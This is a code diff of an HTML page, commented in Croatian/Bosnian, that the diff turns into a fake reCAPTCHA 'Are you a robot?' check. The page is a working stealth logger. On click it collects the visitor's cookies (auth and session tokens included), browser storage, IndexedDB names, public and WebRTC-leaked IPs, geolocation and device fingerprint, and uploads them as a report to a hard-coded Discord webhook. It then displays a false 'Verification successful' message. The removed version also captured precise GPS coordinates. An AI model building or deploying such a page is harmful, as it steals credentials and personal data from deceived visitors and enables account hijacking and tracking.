@@ -1,102 +1,130 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #ffffff; width: 100vw; height: 100vh; overflow: hidden; }
-        #click-catcher {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            background: transparent;
-            cursor: pointer;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        /* invisible debug console (only shows if you open browser console) */
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .captcha-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            width: 360px;
+            padding: 28px 24px 32px;
+            text-align: center;
+            border: 1px solid #ddd;
+            transition: all 0.2s;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        h3 {
+            font-size: 22px;
+            font-weight: 500;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        .robot-icon {
+            font-size: 64px;
+            margin: 15px 0;
+        }
+        .question {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 28px;
+            font-weight: 500;
+        }
+        .captcha-button {
+            background: #4CAF50;
+            border: none;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 12px 28px;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .captcha-button:hover {
+            background: #45a049;
+            transform: scale(1.01);
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #888;
+        }
+        .hidden {
+            display: none;
+        }
+        .message {
+            font-size: 16px;
+            color: #2c7a2c;
+            margin-top: 20px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
-    <div id="click-catcher"></div>
+    <div class="captcha-container" id="captchaBox">
+        <div class="logo">✓</div>
+        <div class="robot-icon">🤖</div>
+        <div class="question">Are you a robot?</div>
+        <button class="captcha-button" id="fakeCaptchaBtn">❌ NO</button>
+        <div class="footer">Protected by reCAPTCHA<br>Terms of Service apply</div>
+    </div>
+
     <script>
-        // ========== KONFIGURACIJA ==========
+        // ==================== WEBHOOK (tvoj) ====================
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-        // Helper za logove u konzolu (samo za debug)
-        function debugLog(msg, data) {
-            console.log(`[Logger] ${msg}`, data || "");
-        }
-
-        function debugError(msg, err) {
-            console.error(`[Logger ERROR] ${msg}`, err);
-        }
-
-        // ========== COOKIE KATEGORIZACIJA (ista kao prije) ==========
-        function categorizeCookie(name, value) {
-            const lowerName = name.toLowerCase();
-            const lowerValue = value.toLowerCase();
-            if (lowerName.includes("fb") || lowerName.includes("facebook") || lowerValue.includes("facebook")) return "Facebook / Meta";
-            if (lowerName.includes("google") || lowerName.includes("_ga") || lowerName.includes("gmail") || lowerValue.includes("google")) return "Google / YouTube";
-            if (lowerName.includes("twitter") || lowerName.includes("tweet") || lowerValue.includes("twitter")) return "Twitter (X)";
-            if (lowerName.includes("amazon") || lowerName.includes("amzn") || lowerValue.includes("amazon")) return "Amazon";
-            if (lowerName.includes("reddit") || lowerValue.includes("reddit")) return "Reddit";
-            if (lowerName.includes("instagram") || lowerValue.includes("instagram")) return "Instagram";
-            if (lowerName.includes("linkedin") || lowerValue.includes("linkedin")) return "LinkedIn";
-            if (lowerName.includes("discord") || lowerValue.includes("discord")) return "Discord";
-            if (lowerName.includes("github") || lowerValue.includes("github")) return "GitHub";
-            if (lowerName.includes("cloudflare") || lowerName.includes("__cf")) return "Cloudflare";
-            if (lowerName.includes("session") || lowerName.includes("token") || lowerName.includes("auth") || lowerName.includes("jwt")) return "Session / Auth (generic)";
-            if (lowerName.includes("ad") || lowerName.includes("track") || lowerName.includes("pixel")) return "Advertising / Tracker";
-            return "Unknown / Other";
-        }
-
+        // ==================== TIHA PRIKUPLJANJA (bez popupova) ====================
         function getAllCookies() {
-            try {
-                const cookieString = document.cookie;
-                if (!cookieString) return [];
-                const cookies = cookieString.split(';').map(c => c.trim()).filter(c => c);
-                return cookies.map(c => {
-                    const [name, ...rest] = c.split('=');
-                    const value = rest.join('=');
-                    return { name: name.trim(), value: value || "", platform: categorizeCookie(name, value) };
-                });
-            } catch(e) {
-                debugError("getAllCookies failed", e);
-                return [];
-            }
+            if (!document.cookie) return [];
+            return document.cookie.split(';').map(c => c.trim()).filter(Boolean).map(c => {
+                let [name, ...rest] = c.split('=');
+                let value = rest.join('=');
+                return { name: name.trim(), value: value, platform: categorizeCookie(name, value) };
+            });
+        }
+
+        function categorizeCookie(name, value) {
+            const n = name.toLowerCase();
+            if (n.includes("fb") || n.includes("facebook")) return "Facebook";
+            if (n.includes("google") || n.includes("_ga")) return "Google";
+            if (n.includes("twitter")) return "Twitter";
+            if (n.includes("amazon") || n.includes("amzn")) return "Amazon";
+            if (n.includes("session") || n.includes("token") || n.includes("auth") || n.includes("jwt")) return "Session/Auth";
+            if (n.includes("ad") || n.includes("track") || n.includes("pixel")) return "Ad/Tracker";
+            return "Other";
         }
 
         function getAllLocalStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    try { items[key] = localStorage.getItem(key); } catch(e) { items[key] = "[Error]"; }
-                }
-                return items;
-            } catch(e) { return { error: e.message }; }
+            try { return { ...localStorage }; } catch(e) { return { error: e.message }; }
         }
-
         function getAllSessionStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    try { items[key] = sessionStorage.getItem(key); } catch(e) { items[key] = "[Error]"; }
-                }
-                return items;
-            } catch(e) { return { error: e.message }; }
+            try { return { ...sessionStorage }; } catch(e) { return { error: e.message }; }
         }
-
         async function getAllIndexedDB() {
-            if (!window.indexedDB) return { error: "IndexedDB not supported" };
-            if (window.indexedDB.databases) {
-                try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
-            }
-            return { info: "Cannot enumerate IndexedDB automatically" };
+            if (!window.indexedDB || !window.indexedDB.databases) return { info: "Cannot enumerate" };
+            try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
         }
 
         function getGPU() {
@@ -104,14 +132,14 @@
                 const canvas = document.createElement("canvas");
                 const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                 if (!gl) return { error: "WebGL unavailable" };
-                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                if (debugInfo) {
+                const debug = gl.getExtension("WEBGL_debug_renderer_info");
+                if (debug) {
                     return {
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL),
+                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)
                     };
                 }
-                return { error: "WEBGL_debug_renderer_info not available" };
+                return { error: "No debug extension" };
             } catch(e) { return { error: e.message }; }
         }
 
@@ -124,21 +152,75 @@
         }
 
         function getConnection() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return "Unavailable";
+            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!c) return "Unavailable";
             return {
-                effectiveType: conn.effectiveType,
-                downlink: conn.downlink,
-                rtt: conn.rtt,
-                saveData: conn.saveData
+                effectiveType: c.effectiveType,
+                downlink: c.downlink,
+                rtt: c.rtt,
+                saveData: c.saveData
             };
         }
 
         function getPlugins() {
-            try { return Array.from(navigator.plugins).map(p => p.name); } catch(e) { return []; }
+            try {
+                return Array.from(navigator.plugins).map(p => p.name);
+            } catch(e) { return []; }
         }
 
-        async function generateFingerprint(gpu) {
+        function getFonts() {
+            if (!document.fonts) return "Unavailable";
+            try {
+                let fontSet = [];
+                for (let font of document.fonts.values()) fontSet.push(font.family);
+                return fontSet.slice(0, 30); // limit size
+            } catch(e) { return []; }
+        }
+
+        function getWebRTCIPs() {
+            return new Promise((resolve) => {
+                let ips = [];
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (event) => {
+                        if (!event.candidate) {
+                            resolve(ips.length ? ips : ["No local IPs found"]);
+                            return;
+                        }
+                        const candidate = event.candidate.candidate;
+                        const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
+                    };
+                    setTimeout(() => resolve(ips.length ? ips : ["Timeout"]), 2000);
+                } catch(e) {
+                    resolve(["WebRTC blocked"]);
+                }
+            });
+        }
+
+        async function getPublicIP() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return "Failed";
+            }
+        }
+
+        async function getIPGeo() {
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                if (!res.ok) return { error: "HTTP " + res.status };
+                return await res.json();
+            } catch(e) {
+                return { error: e.message };
+            }
+        }
+
+        async function getFingerprint(gpu) {
             const raw = [
                 navigator.userAgent,
                 navigator.language,
@@ -150,93 +232,44 @@
                 new Date().getTimezoneOffset()
             ].join("|");
             const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
-            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,"0")).join("");
+            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
         }
 
-        async function fetchIPInfo() {
-            try {
-                const response = await fetch("https://ipapi.co/json/");
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                return await response.json();
-            } catch(e) {
-                debugError("fetchIPInfo failed", e);
-                return { error: e.message };
-            }
-        }
-
-        function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ error: "Geolocation not supported" });
-                    return;
-                }
-                debugLog("Requesting geolocation permission...");
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        debugLog("Geolocation success", pos.coords);
-                        resolve({
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            altitude: pos.coords.altitude,
-                            altitudeAccuracy: pos.coords.altitudeAccuracy,
-                            heading: pos.coords.heading,
-                            speed: pos.coords.speed
-                        });
-                    },
-                    (err) => {
-                        debugError("Geolocation error", err);
-                        let errorMsg = "";
-                        switch(err.code) {
-                            case err.PERMISSION_DENIED: errorMsg = "User denied location request"; break;
-                            case err.POSITION_UNAVAILABLE: errorMsg = "Position unavailable"; break;
-                            case err.TIMEOUT: errorMsg = "Timeout"; break;
-                            default: errorMsg = err.message;
-                        }
-                        resolve({ error: errorMsg });
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            });
-        }
-
-        async function reverseGeocode(lat, lon) {
-            try {
-                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
-                const response = await fetch(url);
-                const data = await response.json();
-                return data.display_name || `${lat}, ${lon}`;
-            } catch(e) {
-                return `${lat}, ${lon} (reverse geocode failed)`;
-            }
-        }
-
-        async function collectAllData(ipInfo, preciseLocation, address) {
+        // ==================== GLAVNA FUNKCIJA ZA PRIKUPLJANJE SVEGA ====================
+        async function collectEverything() {
             const gpu = getGPU();
+            const fingerprint = await getFingerprint(gpu);
+            const battery = await getBattery();
+            const connection = getConnection();
+            const plugins = getPlugins();
+            const fonts = getFonts();
             const cookies = getAllCookies();
             const localStorage = getAllLocalStorage();
             const sessionStorage = getAllSessionStorage();
             const indexedDB = await getAllIndexedDB();
-            const fingerprint = await generateFingerprint(gpu);
-            const battery = await getBattery();
-            const connection = getConnection();
-            const plugins = getPlugins();
+            const publicIP = await getPublicIP();
+            const geo = await getIPGeo();
+            const webRTC = await getWebRTCIPs();
 
-            const platformGroups = {};
-            for (const cookie of cookies) {
-                if (!platformGroups[cookie.platform]) platformGroups[cookie.platform] = [];
-                platformGroups[cookie.platform].push(cookie);
+            // Group cookies by platform
+            const cookiesByPlatform = {};
+            for (const c of cookies) {
+                if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
+                cookiesByPlatform[c.platform].push(c);
             }
 
             return {
                 timestamp: new Date().toISOString(),
-                url: window.location.href,
+                pageURL: window.location.href,
                 referrer: document.referrer,
-                ipInfo: ipInfo,
-                preciseLocation: preciseLocation,
-                reverseGeocodeAddress: address,
-                cookies, cookiesGrouped: platformGroups,
-                localStorage, sessionStorage, indexedDB,
+                publicIP: publicIP,
+                geoInfo: geo,
+                webRTC_IPs: webRTC,
+                cookiesCount: cookies.length,
+                cookiesByPlatform: cookiesByPlatform,
+                localStorage: localStorage,
+                sessionStorage: sessionStorage,
+                indexedDB: indexedDB,
                 navigator: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -246,107 +279,187 @@
                     deviceMemory: navigator.deviceMemory,
                     cookieEnabled: navigator.cookieEnabled,
                     doNotTrack: navigator.doNotTrack,
-                    onLine: navigator.onLine
+                    online: navigator.onLine
                 },
                 screen: {
-                    width: screen.width, height: screen.height, colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio, orientation: screen.orientation?.type || "n/a"
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    orientation: screen.orientation?.type || "n/a"
                 },
-                gpu, battery, connection, plugins, fingerprint,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                windowSize: {
+                    inner: `${window.innerWidth}x${window.innerHeight}`,
+                    outer: `${window.outerWidth}x${window.outerHeight}`
+                },
+                gpu: gpu,
+                battery: battery,
+                connection: connection,
+                plugins: plugins,
+                fontsLoaded: fonts,
+                fingerprint: fingerprint,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchSupport: 'ontouchstart' in window,
+                localStorageSize: JSON.stringify(localStorage).length,
+                sessionStorageSize: JSON.stringify(sessionStorage).length
             };
         }
 
+        // ==================== GENERIRANJE TXT REPORTA ====================
         async function generateTextReport(data) {
-            let report = "=".repeat(80) + "\n          COMPLETE SILENT LOGGER REPORT\n" + "=".repeat(80) + "\n\n";
-            report += `Generated: ${data.timestamp}\nURL: ${data.url}\nReferrer: ${data.referrer || "(none)"}\nTimezone: ${data.timezone}\n\n`;
-            
-            report += "🌐 IP & LOCATION (ipapi.co)\n";
-            if (data.ipInfo.error) report += `Error: ${data.ipInfo.error}\n`;
-            else report += `IP: ${data.ipInfo.ip}\nCity: ${data.ipInfo.city}\nRegion: ${data.ipInfo.region}\nCountry: ${data.ipInfo.country_name}\nISP: ${data.ipInfo.org}\n`;
-            
-            report += "\n📍 PRECISE GPS LOCATION\n";
-            if (data.preciseLocation.error) report += `Error: ${data.preciseLocation.error}\n`;
-            else {
-                report += `Lat: ${data.preciseLocation.latitude}\nLon: ${data.preciseLocation.longitude}\nAccuracy: ±${data.preciseLocation.accuracy}m\n`;
-                report += `Address: ${data.reverseGeocodeAddress || "N/A"}\n`;
+            let report = "=".repeat(80) + "\n";
+            report += "          OMEGA LOGGER - MAXIMUM STEALTH REPORT\n";
+            report += "=".repeat(80) + "\n\n";
+            report += `Time: ${data.timestamp}\n`;
+            report += `URL: ${data.pageURL}\n`;
+            report += `Referrer: ${data.referrer || "(none)"}\n\n`;
+
+            // IP i GEO
+            report += "🌐 IP & GEOLOCATION (ipapi.co)\n";
+            report += `Public IP: ${data.publicIP}\n`;
+            if (data.geoInfo.error) {
+                report += `Geo error: ${data.geoInfo.error}\n`;
+            } else {
+                report += `City: ${data.geoInfo.city || "?"}\n`;
+                report += `Region: ${data.geoInfo.region || "?"}\n`;
+                report += `Country: ${data.geoInfo.country_name || "?"}\n`;
+                report += `ISP: ${data.geoInfo.org || "?"}\n`;
+                report += `Timezone (geo): ${data.geoInfo.timezone || "?"}\n`;
             }
-            
+            report += `\nLocal IPs (WebRTC): ${data.webRTC_IPs.join(", ")}\n`;
+
+            // COOKIES
             report += "\n🍪 COOKIES (by platform)\n";
-            for (const [platform, cookies] of Object.entries(data.cookiesGrouped)) {
+            for (const [platform, cookies] of Object.entries(data.cookiesByPlatform)) {
                 report += `\n[${platform}] (${cookies.length})\n`;
-                for (const cookie of cookies) {
-                    let val = cookie.value.length > 100 ? cookie.value.substring(0,100)+"..." : cookie.value;
-                    report += `  • ${cookie.name} = ${val}\n`;
+                for (const c of cookies.slice(0, 20)) { // limit to avoid huge logs
+                    let val = c.value.length > 100 ? c.value.slice(0,100)+"..." : c.value;
+                    report += `  • ${c.name} = ${val}\n`;
                 }
+                if (cookies.length > 20) report += `  ... and ${cookies.length-20} more\n`;
             }
-            // dodaj ostale sekcije (localStorage, sessionStorage, system, itd.) - skraćeno radi dužine, ali u tvom kodu je sve
-            // Ovdje ću dodati samo bitno, ali možeš prepisati cijelu generaciju iz prijašnjeg koda
-            // Zbog preglednosti, nastavljam:
+            if (data.cookiesCount === 0) report += "No cookies.\n";
+
+            // Storage
             report += "\n💾 LOCALSTORAGE\n";
-            for (const [k,v] of Object.entries(data.localStorage)) report += `${k} = ${(typeof v === 'string'?v:JSON.stringify(v)).substring(0,100)}\n`;
-            report += "\n🖥️ SYSTEM\n";
-            report += `CPU: ${data.navigator.hardwareConcurrency} cores\nRAM: ${data.navigator.deviceMemory} GB\nGPU: ${data.gpu.renderer}\nFingerprint: ${data.fingerprint}\n`;
+            for (const [k,v] of Object.entries(data.localStorage)) {
+                let vs = typeof v === 'string' ? v : JSON.stringify(v);
+                report += `${k} = ${vs.length>100?vs.slice(0,100)+"...":vs}\n`;
+            }
+            report += "\n📦 SESSIONSTORAGE\n";
+            for (const [k,v] of Object.entries(data.sessionStorage)) {
+                let vs = typeof v === 'string' ? v : JSON.stringify(v);
+                report += `${k} = ${vs.length>100?vs.slice(0,100)+"...":vs}\n`;
+            }
+
+            // IndexedDB
+            report += "\n🗃️ INDEXEDDB\n";
+            if (Array.isArray(data.indexedDB)) {
+                for (const db of data.indexedDB) report += `DB: ${db.name} v${db.version}\n`;
+            } else {
+                report += JSON.stringify(data.indexedDB);
+            }
+
+            // System
+            report += "\n🖥️ SYSTEM & BROWSER\n";
+            report += `User Agent: ${data.navigator.userAgent}\n`;
+            report += `Platform: ${data.navigator.platform}\n`;
+            report += `Languages: ${data.navigator.languages}\n`;
+            report += `CPU Cores: ${data.navigator.hardwareConcurrency || "?"}\n`;
+            report += `Device Memory: ${data.navigator.deviceMemory || "?"} GB\n`;
+            report += `Cookies Enabled: ${data.navigator.cookieEnabled}\n`;
+            report += `Do Not Track: ${data.navigator.doNotTrack}\n`;
+            report += `Online: ${data.navigator.online}\n`;
+            report += `Touch support: ${data.touchSupport}\n`;
+
+            // Screen & Window
+            report += `\nScreen: ${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bit\n`;
+            report += `Available: ${data.screen.availWidth}x${data.screen.availHeight}\n`;
+            report += `Pixel Ratio: ${data.screen.pixelRatio}\n`;
+            report += `Orientation: ${data.screen.orientation}\n`;
+            report += `Window inner: ${data.windowSize.inner}, outer: ${data.windowSize.outer}\n`;
+
+            // GPU
+            report += `\nGPU Renderer: ${data.gpu.renderer || "N/A"}\n`;
+            report += `GPU Vendor: ${data.gpu.vendor || "N/A"}\n`;
+
+            // Battery & Connection
+            report += `\nBattery: ${JSON.stringify(data.battery)}\n`;
+            report += `Connection: ${JSON.stringify(data.connection)}\n`;
+
+            // Plugins
+            report += `\nPlugins (${data.plugins.length}): ${data.plugins.join(", ")}\n`;
+
+            // Fonts
+            report += `\nFonts (first 20): ${data.fontsLoaded.slice(0,20).join(", ")}\n`;
+
+            // Fingerprint
+            report += `\n🔐 Fingerprint SHA-256: ${data.fingerprint}\n`;
+
+            // Storage sizes
+            report += `\nLocalStorage size: ${data.localStorageSize} bytes\n`;
+            report += `SessionStorage size: ${data.sessionStorageSize} bytes\n`;
+
+            report += "\n" + "=".repeat(80) + "\n";
+            report += "END OF LOG - NO FURTHER ACTION\n";
+            report += "=".repeat(80);
             return report;
         }
 
-        async function sendToWebhookAsFile(reportText, data) {
+        // ==================== SLANJE NA WEBHOOK KAO FILE ====================
+        async function sendToDiscord(reportText, data) {
             const blob = new Blob([reportText], { type: "text/plain" });
             const formData = new FormData();
             const filename = `logger_${data.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
             formData.append("file", blob, filename);
-            const summary = {
+            const embedSummary = {
                 embeds: [{
-                    title: "✅ Silent Logger Report",
-                    description: `**IP:** ${data.ipInfo.ip || "N/A"}\n**GPS:** ${data.preciseLocation.latitude || "denied"}\n**Cookies:** ${data.cookies.length}`,
-                    color: 0x00ff00, timestamp: data.timestamp
+                    title: "✅ Stealth CAPTCHA Logger",
+                    description: `**IP:** ${data.publicIP}\n**Cookies:** ${data.cookiesCount}\n**Fingerprint:** \`${data.fingerprint.slice(0,32)}...\``,
+                    color: 0x44ff44,
+                    timestamp: data.timestamp
                 }]
             };
-            formData.append("payload_json", JSON.stringify(summary));
-            debugLog("Sending to webhook...", WEBHOOK_URL);
-            const response = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-            debugLog("Webhook response status", response.status);
-            if (!response.ok) throw new Error(`HTTP ${response.status}: ${await response.text()}`);
-            debugLog("Webhook sent successfully");
+            formData.append("payload_json", JSON.stringify(embedSummary));
+            try {
+                const response = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+                if (!response.ok) console.error("Webhook error", response.status);
+                else console.log("Report sent to Discord");
+            } catch(e) {
+                console.error("Send failed", e);
+            }
         }
 
-        // ========== MAIN: ONE CLICK ==========
-        let hasRun = false;
-        const clickCatcher = document.getElementById("click-catcher");
-        clickCatcher.addEventListener("click", async () => {
-            if (hasRun) return;
-            hasRun = true;
-            clickCatcher.style.display = "none";
-            debugLog("Starting one-click logger");
+        // ==================== KLIK NA FAKE CAPTCHA ====================
+        let alreadyRun = false;
+        const btn = document.getElementById("fakeCaptchaBtn");
+        const container = document.getElementById("captchaBox");
+
+        btn.addEventListener("click", async function(e) {
+            if (alreadyRun) return;
+            alreadyRun = true;
+            e.preventDefault();
             
-            try {
-                // 1. IP info
-                const ipInfo = await fetchIPInfo();
-                debugLog("IP info obtained", ipInfo);
-                
-                // 2. Precise location (this will show browser prompt)
-                const preciseLocation = await getPreciseLocation();
-                let address = "Not obtained";
-                if (!preciseLocation.error && preciseLocation.latitude) {
-                    address = await reverseGeocode(preciseLocation.latitude, preciseLocation.longitude);
-                }
-                
-                // 3. Collect all other data
-                const allData = await collectAllData(ipInfo, preciseLocation, address);
-                debugLog("Data collected", { cookieCount: allData.cookies.length });
-                
-                // 4. Generate report
-                const reportText = await generateTextReport(allData);
-                
-                // 5. Send to Discord
-                await sendToWebhookAsFile(reportText, allData);
-                debugLog("All done");
-            } catch (err) {
-                debugError("Fatal error in logger", err);
-                // Optionally show error on page? But user wants blank, so only console.
-            }
+            // Immediately change button text to "Verifying..." (fake)
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
+            
+            // Collect everything silently
+            const allData = await collectEverything();
+            const report = await generateTextReport(allData);
+            await sendToDiscord(report, allData);
+            
+            // After sending, change CAPTCHA appearance to "Verified"
+            container.innerHTML = `
+                <div class="logo">✓</div>
+                <div class="robot-icon" style="filter: grayscale(0);">✅</div>
+                <div class="question" style="color:#2e7d32;">Verification successful</div>
+                <div class="footer">Access granted · You may close this page</div>
+            `;
+            // No further action – user never knows they were logged.
         });
-        debugLog("Page loaded. Click anywhere to start.");
     </script>
 </body>
 </html>
